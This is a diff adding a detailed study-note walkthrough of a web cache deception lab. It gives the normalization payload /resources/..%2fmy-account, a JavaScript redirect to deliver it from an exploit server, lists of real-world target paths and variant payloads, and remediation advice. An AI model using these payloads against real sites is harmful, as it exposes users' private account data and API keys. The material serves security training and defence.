@@ -893,3 +893,1204 @@ Cache does NOT
 Delimiter discrepancy lets attacker hide a fake static extension from the server but not the cache, causing sensitive data to be cached and leaked.
 
 ---
+
+# 🧠 📘Lab-3 WEB CACHE DECEPTION VIA NORMALIZATION DISCREPANCY + STATIC DIRECTORY CACHE RULE
+
+---
+
+## 🟢 1️⃣ OVERVIEW
+
+This lab demonstrates a powerful type of:
+
+```text
+Web Cache Deception (WCD)
+```
+
+where:
+
+```text
+the cache server
+and the origin server
+```
+
+interpret the SAME URL differently.
+
+Because of this mismatch:
+
+```text
+Private user data gets cached as public static content
+```
+
+and attackers can later retrieve it.
+
+---
+
+## 🟢 2️⃣ WHAT IS THIS TOPIC?
+
+### 🧠 Simple Definition
+
+Web Cache Deception means:
+
+```text
+Tricking the cache into storing private content
+```
+
+by making:
+
+```text
+Dynamic content look like static content
+```
+
+---
+
+### 🧠 Normal Web Flow
+
+Normally:
+
+```text
+/private-account
+```
+
+is NEVER cached because:
+
+- it changes per user
+- contains sensitive info
+- contains session-based data
+
+---
+
+But static files like:
+
+```text
+/resources/logo.png
+/resources/app.js
+/resources/style.css
+```
+
+ARE cached.
+
+Why?
+
+Because they are same for everyone.
+
+---
+
+## 🟢 3️⃣ CORE VULNERABILITY IN THIS LAB
+
+The cache and server disagree.
+
+---
+
+### 🔴 Cache thinks:
+
+```text
+/resources/..%2fmy-account
+```
+
+is:
+
+```text
+A static resource under /resources
+```
+
+So cache stores it.
+
+---
+
+### 🟢 Origin server thinks:
+
+```text
+/resources/..%2fmy-account
+```
+
+becomes:
+
+```text
+/my-account
+```
+
+because it:
+
+- decodes `%2f → /`
+- resolves `..`
+
+This process is called:
+
+```text
+Normalization
+```
+
+---
+
+## 🟢 4️⃣ FINAL RESULT
+
+The server returns:
+
+```text
+Private account page
+```
+
+BUT cache stores it as:
+
+```text
+Public static content
+```
+
+---
+
+## 🟢 5️⃣ KEY CONCEPTS
+
+### 🔹 1. Cache
+
+A middle layer between:
+
+```text
+Browser ↔ Cache ↔ Origin Server
+```
+
+Purpose:
+
+- speed
+- performance
+- lower server load
+
+---
+
+### 🔹 2. Origin Server
+
+The real backend application.
+
+Usually:
+
+```text
+Django
+Node.js
+Rails
+Spring
+PHP
+ASP.NET
+```
+
+---
+
+### 🔹 3. Cache Rules
+
+Caches decide what to store using rules like:
+
+```text
+/resources/*
+```
+
+or:
+
+```text
+*.js
+*.css
+*.png
+```
+
+---
+
+### 🔹 4. Normalization
+
+Normalization means:
+
+```text
+Cleaning and simplifying paths
+```
+
+Example:
+
+```text
+/aaa/../admin
+→ /admin
+```
+
+---
+
+### 🔹 5. Path Traversal Sequence
+
+This:
+
+```text
+../
+```
+
+moves one directory backward.
+
+Encoded version:
+
+```text
+..%2f
+```
+
+because:
+
+```text
+%2f = /
+```
+
+---
+
+## 🟢 6️⃣ FULL ATTACK CHAIN
+
+### Step 1
+
+Attacker finds sensitive endpoint:
+
+```text
+/my-account
+```
+
+returns API key.
+
+---
+
+### Step 2
+
+Attacker discovers server normalization:
+
+```text
+/aaa/..%2fmy-account
+→ works
+```
+
+Meaning:
+
+```text
+Server resolves traversal
+```
+
+---
+
+### Step 3
+
+Attacker discovers cache rule:
+
+```text
+/resources/*
+```
+
+gets cached.
+
+---
+
+### Step 4
+
+Attacker combines both behaviors:
+
+```text
+/resources/..%2fmy-account
+```
+
+---
+
+### Step 5
+
+Cache sees:
+
+```text
+/resources/...
+```
+
+→ cache it.
+
+---
+
+### Step 6
+
+Server sees:
+
+```text
+/my-account
+```
+
+→ return private data.
+
+---
+
+### Step 7
+
+Victim visits malicious URL.
+
+---
+
+### Step 8
+
+Victim's private page becomes cached.
+
+---
+
+### Step 9
+
+Attacker opens same URL.
+
+---
+
+### Step 🔟
+
+Cache serves victim data to attacker.
+
+---
+
+## 🟢 7️⃣ LAB WALKTHROUGH (EXACT DETAILED STEPS)
+
+### 🟢 STEP 1 — Login
+
+Credentials:
+
+```text
+wiener : peter
+```
+
+Go to:
+
+```text
+/my-account
+```
+
+Observe:
+
+```text
+API key visible
+```
+
+This is target sensitive data.
+
+---
+
+### 🟢 STEP 2 — Send Request to Repeater
+
+In:
+
+```text
+Proxy → HTTP history
+```
+
+Find:
+
+```http
+GET /my-account
+```
+
+Right click:
+
+```text
+Send to Repeater
+```
+
+---
+
+### 🟢 STEP 3 — Test Path Abstraction
+
+Change path:
+
+```text
+/my-account/abc
+```
+
+Send request.
+
+Response:
+
+```text
+404 Not Found
+```
+
+Meaning:
+
+```text
+Server does NOT ignore extra path
+```
+
+So:
+
+```text
+No path abstraction vulnerability
+```
+
+---
+
+### 🟢 STEP 4 — Test Arbitrary String
+
+Change path:
+
+```text
+/my-accountabc
+```
+
+Send request.
+
+Again:
+
+```text
+404
+```
+
+with:
+
+```text
+No cache evidence
+```
+
+Save this response mentally as baseline behavior.
+
+---
+
+### 🟢 STEP 5 — Send to Intruder
+
+Right click request:
+
+```text
+Send to Intruder
+```
+
+---
+
+### 🟢 STEP 6 — Setup Delimiter Testing
+
+Attack type:
+
+```text
+Sniper
+```
+
+Payload position:
+
+```text
+/my-account§§abc
+```
+
+Meaning:
+
+```text
+Burp inserts delimiter characters here.
+```
+
+---
+
+### 🟢 STEP 7 — Add Delimiter List
+
+Add delimiter payloads like:
+
+```text
+;
+?
+#
+%23
+%2f
+etc
+```
+
+VERY IMPORTANT:
+
+Turn OFF:
+
+```text
+URL-encode these characters
+```
+
+Otherwise Burp modifies them.
+
+---
+
+### 🟢 STEP 8 — Run Attack
+
+Click:
+
+```text
+Start attack
+```
+
+Sort results by:
+
+```text
+Status code
+```
+
+---
+
+### 🟢 STEP 9 — Analyze Results
+
+Only:
+
+```text
+?
+```
+
+returns:
+
+```text
+200 OK
+```
+
+with API key.
+
+Everything else:
+
+```text
+404
+```
+
+Meaning:
+
+```text
+Server only treats ? as delimiter
+```
+
+But:
+
+```text
+? is normal URL behavior
+```
+
+So:
+
+```text
+No useful delimiter discrepancy
+```
+
+Move to normalization testing.
+
+---
+
+### 🟢 STEP 🔟 — Test Normalization
+
+Back in Repeater.
+
+Change path:
+
+```text
+/aaa/..%2fmy-account
+```
+
+Send request.
+
+Response:
+
+```text
+200 OK
+```
+
+AND:
+
+```text
+API key visible
+```
+
+Meaning:
+
+```text
+Server normalized path.
+```
+
+Flow:
+
+```text
+/aaa/..%2fmy-account
+→ decode %2f
+→ /aaa/../my-account
+→ resolve traversal
+→ /my-account
+```
+
+---
+
+### 🟢 STEP 1️⃣1️⃣ — Find Static Directory
+
+Go to:
+
+```text
+HTTP history
+```
+
+Look for static resources.
+
+Notice:
+
+```text
+/resources/...
+```
+
+Examples:
+
+```text
+/resources/js/tracking.js
+/resources/images/logo.svg
+```
+
+Observe headers:
+
+```http
+X-Cache: hit
+```
+
+Meaning:
+
+```text
+/resources has cache rule
+```
+
+VERY IMPORTANT.
+
+---
+
+### 🟢 STEP 1️⃣2️⃣ — Test Cache Normalization
+
+Take ANY `/resources` request.
+
+Send to Repeater.
+
+Modify path:
+
+```text
+/resources/..%2fabc
+```
+
+Send request.
+
+---
+
+### First Request
+
+Header:
+
+```http
+X-Cache: miss
+```
+
+Meaning:
+
+```text
+Not cached yet
+```
+
+---
+
+### Send AGAIN
+
+Now:
+
+```http
+X-Cache: hit
+```
+
+Meaning:
+
+```text
+Cache stored it
+```
+
+Possible reason:
+
+```text
+Cache only checks /resources prefix
+```
+
+BUT we still need confirmation.
+
+### 📸 Screenshot — First Request `X-Cache: miss`, Second Request `X-Cache: hit`
+
+![cache-miss-hit-normalization](../images/cache-miss-hit-normalization.png)
+
+---
+
+### 🟢 STEP 1️⃣3️⃣ — Confirm Static Directory Rule
+
+Now test:
+
+```text
+/resources/aaa
+```
+
+Send twice.
+
+---
+
+### First Request
+
+```http
+X-Cache: miss
+```
+
+---
+
+### Second Request
+
+```http
+X-Cache: hit
+```
+
+CONFIRMED:
+
+```text
+Everything under /resources gets cached
+```
+
+---
+
+### 🟢 STEP 1️⃣4️⃣ — Build Final Payload
+
+Now combine both discoveries.
+
+Payload:
+
+```text
+/resources/..%2fmy-account
+```
+
+---
+
+## 🟢 8️⃣ WHY THIS WORKS
+
+### 🔴 Cache Interpretation
+
+```text
+/resources/..%2fmy-account
+```
+
+Starts with:
+
+```text
+/resources
+```
+
+So:
+
+```text
+CACHE IT
+```
+
+---
+
+### 🟢 Origin Server Interpretation
+
+```text
+/resources/..%2fmy-account
+→ /my-account
+```
+
+So server returns:
+
+```text
+Private account page
+```
+
+---
+
+## 🟢 9️⃣ RESULT
+
+```text
+Private data becomes cached
+```
+
+---
+
+### 🟢 STEP 1️⃣5️⃣ — Verify Vulnerability
+
+Send:
+
+```text
+/resources/..%2fmy-account
+```
+
+---
+
+### First Response
+
+```http
+X-Cache: miss
+```
+
+---
+
+### Second Response
+
+```http
+X-Cache: hit
+```
+
+AND:
+
+```text
+API key still visible
+```
+
+Meaning:
+
+```text
+Private response is cached
+```
+
+Vulnerability confirmed.
+
+---
+
+### 🟢 STEP 1️⃣6️⃣ — Create Exploit
+
+Go to:
+
+```text
+Exploit Server
+```
+
+Payload:
+
+```html
+<script>
+document.location="https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account?wcd"
+</script>
+```
+
+---
+
+### Why `?wcd` ?
+
+```text
+Cache buster.
+```
+
+Without it:
+
+```text
+Victim may receive YOUR cached response instead.
+```
+
+---
+
+### 🟢 STEP 1️⃣7️⃣ — Deliver Exploit
+
+Click:
+
+```text
+Deliver exploit to victim
+```
+
+Victim visits malicious URL.
+
+---
+
+### 🟢 STEP 1️⃣8️⃣ — Retrieve Carlos Data
+
+Open:
+
+```text
+/resources/..%2fmy-account?wcd
+```
+
+Now cached response contains:
+
+```text
+Carlos API key
+```
+
+Copy key.
+
+Submit solution.
+
+Lab solved.
+
+---
+
+## 🟢 🔟 REAL-WORLD MENTAL MODEL
+
+Think of cache like:
+
+```text
+A security guard checking ONLY first folder name
+```
+
+Cache sees:
+
+```text
+/resources
+```
+
+and says:
+
+```text
+Safe static file
+```
+
+---
+
+But backend server secretly transforms:
+
+```text
+/resources/..%2fmy-account
+→ /my-account
+```
+
+So attacker tricks cache into storing:
+
+```text
+Private user page
+```
+
+---
+
+## 🟢 1️⃣1️⃣ REAL-WORLD HIGH-VALUE TARGETS
+
+### 🔹 1. Account Pages
+
+```text
+/account
+/profile
+/dashboard
+/settings
+```
+
+---
+
+### 🔹 2. API Responses
+
+```text
+/api/me
+/api/private
+/graphql
+```
+
+---
+
+### 🔹 3. Banking Data
+
+```text
+/cards
+/transactions
+/wallet
+```
+
+---
+
+### 🔹 4. Admin Panels
+
+```text
+/admin
+/internal
+/manage
+```
+
+---
+
+### 🔹 5. SaaS Dashboards
+
+```text
+/customer
+/team
+/billing
+```
+
+---
+
+## 🟢 1️⃣2️⃣ REAL-WORLD VARIATIONS
+
+### 🔹 Variation 1 — Static Extension
+
+```text
+/profile.js
+```
+
+---
+
+### 🔹 Variation 2 — Delimiter
+
+```text
+/profile;foo.js
+```
+
+---
+
+### 🔹 Variation 3 — Encoded Delimiter
+
+```text
+/profile%3ffoo.js
+```
+
+---
+
+### 🔹 Variation 4 — Static Directory
+
+```text
+/static/..%2fprofile
+```
+
+---
+
+### 🔹 Variation 5 — CDN Specific
+
+Some CDNs decode differently:
+
+```text
+Akamai
+Cloudflare
+Fastly
+CloudFront
+```
+
+Each behaves differently.
+
+---
+
+## 🟢 1️⃣3️⃣ WHY DEVELOPERS ACCIDENTALLY CREATE THIS
+
+### Backend Developers
+
+Focus on:
+
+```text
+Routing
+and normalization.
+```
+
+---
+
+### CDN/Cache Teams
+
+Focus on:
+
+```text
+Performance
+```
+
+---
+
+### Problem
+
+Nobody checks:
+
+```text
+Do BOTH systems interpret URL same way?
+```
+
+---
+
+## 🟢 1️⃣4️⃣ ROOT CAUSE
+
+```text
+Parser inconsistency
+```
+
+between:
+
+```text
+CDN
+Reverse proxy
+Cache
+Load balancer
+Backend framework
+```
+
+---
+
+## 🟢 1️⃣5️⃣ REMEDIATION
+
+### ✔ 1. Never Cache Authenticated Responses
+
+Use:
+
+```http
+Cache-Control: private, no-store
+```
+
+---
+
+### ✔ 2. Normalize BEFORE Cache Rules
+
+```text
+Cache and origin MUST use same parser behavior.
+```
+
+---
+
+### ✔ 3. Disable Caching for Sensitive Paths
+
+Never cache:
+
+```text
+/account
+/profile
+/api
+```
+
+---
+
+### ✔ 4. Reject Encoded Traversal
+
+Block:
+
+```text
+..%2f
+%2e%2e/
+```
+
+---
+
+### ✔ 5. Use Consistent URL Parsing
+
+All layers should:
+
+- decode same way
+- normalize same way
+- apply same delimiters
+
+---
+
+## 🟢 1️⃣6️⃣ DETECTION CHECKLIST
+
+### Ask:
+
+```text
+Does server normalize?
+```
+
+Test:
+
+```text
+/aaa/..%2fprofile
+```
+
+---
+
+### Ask:
+
+```text
+Does cache trust static directory?
+```
+
+Test:
+
+```text
+/resources/aaa
+```
+
+---
+
+### Ask:
+
+```text
+Do cache and server interpret differently?
+```
+
+Test:
+
+```text
+/resources/..%2fprofile
+```
+
+---
+
+## 🟢 1️⃣7️⃣ VULNERABILITY FORMULA
+
+```text
+Cache trusts fake static path
++
+Server normalizes to sensitive endpoint
+=
+Web Cache Deception
+```
+
+---
+
+# 🔥 FINAL ONE-LINE SUMMARY
+
+The cache stores a private page because the server secretly transforms a fake static path into a sensitive endpoint.
